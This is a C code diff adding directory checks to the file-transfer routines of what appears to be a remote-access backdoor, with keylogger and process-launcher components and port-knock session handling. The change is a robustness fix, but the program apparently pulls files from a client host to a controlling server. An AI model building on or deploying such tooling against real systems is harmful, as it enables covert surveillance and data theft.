@@ -6,7 +6,7 @@
 #include <string.h>
 #include <unistd.h>
 #include "networking.h"
-
+#include <sys/stat.h>
 #ifdef CLIENT_BUILD
 #include "keylogging/keylogger.h"
 #include "process_launcher/process_launcher.h"
@@ -531,6 +531,21 @@ void process_receive_file(struct session_info * session_info) {
 
     log_message("Filename: %s", filename);
 #ifdef CLIENT_BUILD
+    /* Reject directories */
+    struct stat path_stat;
+    if (stat(filename, &path_stat) == -1) {
+        fprintf(stderr, "Failed to stat file: %s\n", filename);
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, "Failed to open file");
+        send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
+        return;
+    }
+    if (S_ISDIR(path_stat.st_mode)) {
+        fprintf(stderr, "Path is a directory, not a file: %s\n", filename);
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, "Path is a directory, not a file");
+        send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
+        return;
+    }
+
     FILE * file = fopen(filename, "rb");
     if (file == NULL) {
         fprintf(stderr, "Failed to open file: %s\n", filename);
@@ -572,7 +587,6 @@ void process_receive_file(struct session_info * session_info) {
     send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);
 
 #endif
-
 }
 
 // NOLINTNEXTLINE
@@ -733,6 +747,20 @@ void send_file(struct server_options * server_options) {
         message[bytes_read - 1] = '\0';
         printf("Reading file: %s\n", message);
         fflush(stdout);
+
+        struct stat path_stat;
+        if (stat(message, &path_stat) == -1) {
+            log_message("Failed to stat file: %s\n", message);
+            free(message);
+            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+            return;
+        }
+        if (S_ISDIR(path_stat.st_mode)) {
+            log_message("Path is a directory, not a file: %s\n", message);
+            free(message);
+            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+            return;
+        }
 
         FILE * file = fopen(message, "rb");
         if (file == NULL) {
@@ -931,7 +959,6 @@ void send_receive_file(const struct server_options * server_options) {
         fprintf(stderr, "F_SETFL on STDIN\n");
     }
 }
-
 
 // NOLINTNEXTLINE
 void handle_response(struct session_info * session_info) {
